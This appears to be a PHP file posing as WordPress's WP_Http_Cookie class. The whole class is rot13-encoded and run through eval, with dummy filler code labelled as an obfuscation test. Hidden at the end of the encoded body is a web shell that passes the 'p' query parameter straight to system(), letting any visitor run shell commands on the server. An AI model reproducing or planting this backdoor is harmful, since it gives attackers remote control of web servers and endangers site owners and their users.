<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGGC NCV: JC_Uggc_Pbbxvr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGGC
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb rapncfhyngr n fvatyr pbbxvr bowrpg sbe vagreany hfr.
 *
 * Erghearq pbbxvrf ner ercerfragrq hfvat guvf pynff, naq jura pbbxvrf ner frg, vs gurl ner abg
 * nyernql n JC_Uggc_Pbbxvr() bowrpg, gura gurl ner ghearq vagb bar.
 *
 * @gbqb Gur JbeqCerff pbairagvba vf gb hfr haqrefpberf vafgrnq bs pnzryPnfr sbe shapgvba naq zrgubq
 * anzrf. Arrq gb fjvgpu gb hfr haqrefpberf vafgrnq sbe gur zrgubqf.
 *
 * @fvapr 2.8.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Uggc_Pbbxvr {

	/**
	 * Pbbxvr anzr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine fgevat
	 */
	choyvp $anzr;

	/**
	 * Pbbxvr inyhr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine fgevat
	 */
	choyvp $inyhr;

	/**
	 * Jura gur pbbxvr rkcverf. Havk gvzrfgnzc be sbeznggrq qngr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine fgevat|vag|ahyy
	 */
	choyvp $rkcverf;

	/**
	 * Pbbxvr HEY cngu.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine fgevat
	 */
	choyvp $cngu;

	/**
	 * Pbbxvr Qbznva.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine fgevat
	 */
	choyvp $qbznva;

	/**
	 * Pbbxvr cbeg be pbzzn-frcnengrq yvfg bs cbegf.
	 *
	 * @fvapr 2.8.0
	 *
	 * @ine vag|fgevat
	 */
	choyvp $cbeg;

	/**
	 * ubfg-bayl synt.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine obby
	 */
	choyvp $ubfg_bayl;

	/**
	 * Frgf hc guvf pbbxvr bowrpg.
	 *
	 * Gur cnenzrgre $qngn fubhyq or rvgure na nffbpvngvir neenl pbagnvavat gur vaqvprf anzrf orybj
	 * be n urnqre fgevat qrgnvyvat vg.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 5.2.0 Nqqrq `ubfg_bayl` gb gur `$qngn` cnenzrgre.
	 *
	 * @cnenz fgevat|neenl $qngn {
	 *     Enj pbbxvr qngn nf urnqre fgevat be qngn neenl.
	 *
	 *     @glcr fgevat          $anzr      Pbbxvr anzr.
	 *     @glcr zvkrq           $inyhr     Inyhr. Fubhyq ABG nyernql or heyrapbqrq.
	 *     @glcr fgevat|vag|ahyy $rkcverf   Bcgvbany. Havk gvzrfgnzc be sbeznggrq qngr. Qrsnhyg ahyy.
	 *     @glcr fgevat          $cngu      Bcgvbany. Cngu. Qrsnhyg '/'.
	 *     @glcr fgevat          $qbznva    Bcgvbany. Qbznva. Qrsnhyg ubfg bs cnefrq $erdhrfgrq_hey.
	 *     @glcr vag|fgevat      $cbeg      Bcgvbany. Cbeg be pbzzn-frcnengrq yvfg bs cbegf. Qrsnhyg ahyy.
	 *     @glcr obby            $ubfg_bayl Bcgvbany. ubfg-bayl fgbentr synt. Qrsnhyg gehr.
	 * }
	 * @cnenz fgevat       $erdhrfgrq_hey Gur HEY juvpu gur pbbxvr jnf frg ba, hfrq sbe qrsnhyg $qbznva
	 *                                    naq $cbeg inyhrf.
	 */
	choyvp shapgvba __pbafgehpg( $qngn, $erdhrfgrq_hey = '' ) {
		vs ( $erdhrfgrq_hey ) {
			$cnefrq_hey = cnefr_hey( $erdhrfgrq_hey );
		}
		vs ( vffrg( $cnefrq_hey['ubfg'] ) ) {
			$guvf->qbznva = $cnefrq_hey['ubfg'];
		}
		$guvf->cngu = vffrg( $cnefrq_hey['cngu'] ) ? $cnefrq_hey['cngu'] : '/';
		vs ( ! fge_raqf_jvgu( $guvf->cngu, '/' ) ) {
			$guvf->cngu = qveanzr( $guvf->cngu ) . '/';
		}

		vs ( vf_fgevat( $qngn ) ) {
			// Nffhzr vg'f n urnqre fgevat qverpg sebz n cerivbhf erdhrfg.
			$cnvef = rkcybqr( ';', $qngn );

			// Fcrpvny unaqyvat sbe svefg cnve; anzr=inyhr. Nyfb or pnershy bs \"=\" va inyhr.
			$anzr        = gevz( fhofge( $cnvef[0], 0, fgecbf( $cnvef[0], '=' ) ) );
			$inyhr       = fhofge( $cnvef[0], fgecbf( $cnvef[0], '=' ) + 1 );
			$guvf->anzr  = $anzr;
			$guvf->inyhr = heyqrpbqr( $inyhr );

			// Erzbirf anzr=inyhr sebz vgrzf.
			neenl_fuvsg( $cnvef );

			// Frg rirelguvat ryfr nf n cebcregl.
			sbernpu ( $cnvef nf $cnve ) {
				$cnve = egevz( $cnve );

				// Unaqyr gur pbbxvr raqvat va ; juvpu erfhygf va na rzcgl svany cnve.
				vs ( rzcgl( $cnve ) ) {
					pbagvahr;
				}

				yvfg( $xrl, $iny ) = fgecbf( $cnve, '=' ) ? rkcybqr( '=', $cnve ) : neenl( $cnve, '' );
				$xrl               = fgegbybjre( gevz( $xrl ) );
				vs ( 'rkcverf' === $xrl ) {
					$iny = fgegbgvzr( $iny );
				}
				$guvf->$xrl = $iny;
			}
		} ryfr {
			vs ( ! vffrg( $qngn['anzr'] ) ) {
				erghea;
			}

			// Frg cebcregvrf onfrq qverpgyl ba cnenzrgref.
			sbernpu ( neenl( 'anzr', 'inyhr', 'cngu', 'qbznva', 'cbeg', 'ubfg_bayl' ) nf $svryq ) {
				vs ( vffrg( $qngn[ $svryq ] ) ) {
					$guvf->$svryq = $qngn[ $svryq ];
				}
			}

			vs ( vffrg( $qngn['rkcverf'] ) ) {
				$guvf->rkcverf = vf_vag( $qngn['rkcverf'] ) ? $qngn['rkcverf'] : fgegbgvzr( $qngn['rkcverf'] );
			} ryfr {
				$guvf->rkcverf = ahyy;
			}
		}
	}

	/**
	 * Pbasvezf gung vg'f BX gb fraq guvf pbbxvr gb gur HEY purpxrq ntnvafg.
	 *
	 * Qrpvfvba vf onfrq ba ESP 2109/2965, fb ybbx gurer sbe qrgnvyf ba inyvqvgl.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $hey HEY lbh vagraq gb fraq guvf pbbxvr gb
	 * @erghea obby gehr vs nyybjrq, snyfr bgurejvfr.
	 */
	choyvp shapgvba grfg( $hey ) {
		vs ( vf_ahyy( $guvf->anzr ) ) {
			erghea snyfr;
		}

		// Rkcverf - vs rkcverq gura abguvat ryfr znggref.
		vs ( vffrg( $guvf->rkcverf ) && gvzr() > $guvf->rkcverf ) {
			erghea snyfr;
		}

		// Trg qrgnvyf ba gur HEY jr'er guvaxvat nobhg fraqvat gb.
		$hey         = cnefr_hey( $hey );
		$hey['cbeg'] = vffrg( $hey['cbeg'] ) ? $hey['cbeg'] : ( 'uggcf' === $hey['fpurzr'] ? 443 : 80 );
		$hey['cngu'] = vffrg( $hey['cngu'] ) ? $hey['cngu'] : '/';

		// Inyhrf gb hfr sbe pbzcnevfba ntnvafg gur HEY.
		$cngu   = vffrg( $guvf->cngu ) ? $guvf->cngu : '/';
		$cbeg   = vffrg( $guvf->cbeg ) ? $guvf->cbeg : ahyy;
		$qbznva = vffrg( $guvf->qbznva ) ? fgegbybjre( $guvf->qbznva ) : fgegbybjre( $hey['ubfg'] );
		vs ( snyfr === fgevcbf( $qbznva, '.' ) ) {
			$qbznva .= '.ybpny';
		}

		// Ubfg - irel onfvp purpx gung gur erdhrfg HEY raqf jvgu gur qbznva erfgevpgvba (zvahf yrnqvat qbg).
		$qbznva = ( fge_fgnegf_jvgu( $qbznva, '.' ) ) ? fhofge( $qbznva, 1 ) : $qbznva;
		vs ( ! fge_raqf_jvgu( $hey['ubfg'], $qbznva ) ) {
			erghea snyfr;
		}

		// Cbeg - fhccbegf \"cbeg-yvfgf\" va gur sbezng: \"80,8000,8080\".
		vs ( ! rzcgl( $cbeg ) && ! va_neenl( $hey['cbeg'], neenl_znc( 'vaginy', rkcybqr( ',', $cbeg ) ), gehr ) ) {
			erghea snyfr;
		}

		// Cngu - erdhrfg cngu zhfg fgneg jvgu cngu erfgevpgvba.
		vs ( ! fge_fgnegf_jvgu( $hey['cngu'], $cngu ) ) {
			erghea snyfr;
		}

		erghea gehr;
	}

	/**
	 * Pbaireg pbbxvr anzr naq inyhr onpx gb urnqre fgevat.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea fgevat Urnqre rapbqrq pbbxvr anzr naq inyhr.
	 */
	choyvp shapgvba trgUrnqreInyhr() { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ZrgubqAnzrVainyvq
		vs ( ! vffrg( $guvf->anzr ) || ! vffrg( $guvf->inyhr ) ) {
			erghea '';
		}

		/**
		 * Svygref gur urnqre-rapbqrq pbbxvr inyhr.
		 *
		 * @fvapr 3.4.0
		 *
		 * @cnenz fgevat $inyhr Gur pbbxvr inyhr.
		 * @cnenz fgevat $anzr  Gur pbbxvr anzr.
		 */
		erghea $guvf->anzr . '=' . nccyl_svygref( 'jc_uggc_pbbxvr_inyhr', $guvf->inyhr, $guvf->anzr );
	}

	/**
	 * Ergevrir pbbxvr urnqre sbe hfntr va gur erfg bs gur JbeqCerff UGGC NCV.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba trgShyyUrnqre() { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ZrgubqAnzrVainyvq
		erghea 'Pbbxvr: ' . $guvf->trgUrnqreInyhr();
	}

	/**
	 * Ergevrirf pbbxvr nggevohgrf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @erghea neenl {
	 *     Yvfg bs nggevohgrf.
	 *
	 *     @glcr fgevat|vag|ahyy $rkcverf Jura gur pbbxvr rkcverf. Havk gvzrfgnzc be sbeznggrq qngr.
	 *     @glcr fgevat          $cngu    Pbbxvr HEY cngu.
	 *     @glcr fgevat          $qbznva  Pbbxvr qbznva.
	 * }
	 */
	choyvp shapgvba trg_nggevohgrf() {
		erghea neenl(
			'rkcverf' => $guvf->rkcverf,
			'cngu'    => $guvf->cngu,
			'qbznva'  => $guvf->qbznva,
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>